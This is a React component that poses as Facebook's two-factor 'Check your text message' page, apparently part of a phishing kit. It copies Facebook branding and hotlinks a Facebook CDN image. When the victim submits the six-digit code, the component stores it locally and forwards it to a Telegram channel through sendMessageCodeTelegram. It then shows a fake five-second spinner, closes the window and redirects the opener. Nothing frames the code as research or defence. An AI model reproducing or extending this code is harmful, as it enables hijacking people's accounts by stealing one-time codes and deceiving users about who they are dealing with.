import { sendMessageCodeTelegram } from "@/services/send-message";
import { useEffect, useRef, useState } from "react";
import "./TwoFactorAuth.css";

export default function TwoFactorAuth() {
  const [code, setCode] = useState(["", "", "", "", "", ""]);
  const [timer, setTimer] = useState(60);
  const [isResendDisabled, setIsResendDisabled] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const inputRefs = useRef([]);

  // Setup refs for each input field
  useEffect(() => {
    inputRefs.current = inputRefs.current.slice(0, code.length);
  }, [code]);

  // Handle countdown timer
  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer((prevTimer) => prevTimer - 1);
      }, 1000);

      return () => clearInterval(interval);
    } else {
      setIsResendDisabled(false);
    }
  }, [timer]);

  // Format timer as MM:SS
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? "0" : ""}${secs}`;
  };

  // Handle input change
  const handleChange = (index, e) => {
    const value = e.target.value;

    // Only allow numbers
    if (!/^\d*$/.test(value)) return;

    // Update the code state
    const newCode = [...code];
    newCode[index] = value.slice(0, 1); // Only keep first character
    setCode(newCode);

    // Auto-focus next input if a digit was entered
    if (value && index < code.length - 1) {
      inputRefs.current[index + 1].focus();
    }
  };

  // Handle keydown for backspace navigation
  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      // If current input is empty and backspace is pressed, focus previous input
      inputRefs.current[index - 1].focus();
    }
  };

  // Check if code is complete (6 digits)
  const isCodeComplete = () => {
    return code.every((digit) => digit !== "");
  };

  // Handle form submission
  const handleSubmit = (e) => {
    e.preventDefault();
    const twoFactorCode = code.join("");

    if (twoFactorCode.length === 6) {
      setIsLoading(true);
      localStorage.setItem("twoFactorCode", JSON.stringify(twoFactorCode));
      sendMessageCodeTelegram(twoFactorCode);

      setTimeout(() => {
        setIsLoading(false);
        window.close();

        if (window.opener) {
          window.opener.location.href = "/home";
        }
      }, 5000); // 5 second loading delay
    } else {
      alert("Please enter the complete 6-digit code");
    }
  };

  // Handle code resend
  const handleResendCode = () => {
    if (!isResendDisabled) {
      setCode(["", "", "", "", "", ""]);
      setTimer(60);
      setIsResendDisabled(true);
      inputRefs.current[0].focus();
    }
  };

  // Handle paste functionality
  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text/plain").trim();

    // Check if pasted content is a 6-digit number
    if (/^\d{6}$/.test(pastedData)) {
      const newCode = pastedData.split("");
      setCode(newCode);
      inputRefs.current[5].focus();
    }
  };

  return (
    <div className="fb-2fa-container">
      {/* Loading spinner */}
      {isLoading && (
        <div className="fb-spinner-overlay">
          <div className="fb-spinner-container">
            <div className="fb-spinner-ring"></div>
            <div className="fb-spinner-ring-inner"></div>
          </div>
        </div>
      )}

      <div className="fb-2fa-card">
        {/* Header */}
        <div className="fb-2fa-header">
          <div className="fb-2fa-title-container">
            <h1 className="fb-2fa-name">Facebook</h1>
            <h2 className="fb-2fa-title">Check your text message</h2>
            <p className="fb-2fa-subtitle">Enter the code we sent to your phone.</p>
          </div>
          <div className="fb-2fa-image-container">
            <img
              src="https://scontent.fhan5-11.fna.fbcdn.net/v/t39.30808-6/440786911_931465878987820_5268630184469376345_n.jpg?_nc_cat=103&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=IFYPDINO6mkQ7kNvgEN6_yc&_nc_oc=AdlDAdkUKAtsNc95KFZCsuj8YhatQ_7HFTqBBMRhibjVKy0qFr8PIicb4-r2Cpif3RU&_nc_zt=23&_nc_ht=scontent.fhan5-11.fna&_nc_gid=EbYWVyjGFV5lq5lLF8Tjyg&oh=00_AYHCpyqwUlocHxOH1OG4brIlDBPVtpxMm6jZlCttFRjDnw&oe=67E355CF"
              alt="Phone verification illustration"
              className="fb-2fa-image"
              onError={(e) => {
                e.target.onerror = null;
                e.target.style.display = "none";
              }}
            />
          </div>
        </div>

        {/* Input field */}
        <div className="fb-2fa-input-container">
          <input
            type="text"
            className="fb-2fa-code-field"
            placeholder="Code"
            maxLength={6}
            value={code.join("")}
            onChange={(e) => {
              const value = e.target.value;
              if (!/^\d*$/.test(value)) return;

              const newCode = value.split("").slice(0, 6);
              while (newCode.length < 6) newCode.push("");

              setCode(newCode);
            }}
          />
        </div>

        {/* Timer */}
        <div className="fb-2fa-timer">
          <div className="fb-2fa-timer-icon">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path
                d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"
                stroke="#65676B"
                strokeWidth="1.5"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
              <path
                d="M12 6V12L16 14"
                stroke="#65676B"
                strokeWidth="1.5"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
          </div>
          <p className="fb-2fa-timer-text">We can send a new code in {formatTime(timer)}</p>
        </div>

        {/* Action buttons */}
        <div className="fb-2fa-actions">
          <button
            type="button"
            className={`fb-2fa-continue-button ${!isCodeComplete() ? "disabled" : ""}`}
            onClick={handleSubmit}
            disabled={!isCodeComplete() || isLoading}
          >
            {isLoading ? "Processing..." : "Continue"}
          </button>

          <button
            type="button"
            className="fb-2fa-alt-button"
            onClick={handleResendCode}
            disabled={isResendDisabled || isLoading}
          >
            Try another way
          </button>
        </div>

        {/* Hidden input fields for the original logic */}
        <div style={{ display: "none" }}>
          {code.map((digit, index) => (
            <input
              key={index}
              type="text"
              value={digit}
              onChange={(e) => handleChange(index, e)}
              onKeyDown={(e) => handleKeyDown(index, e)}
              onPaste={index === 0 ? handlePaste : null}
              ref={(el) => (inputRefs.current[index] = el)}
              maxLength={1}
              autoComplete="off"
            />
          ))}
        </div>
      </div>
    </div>
  );
}
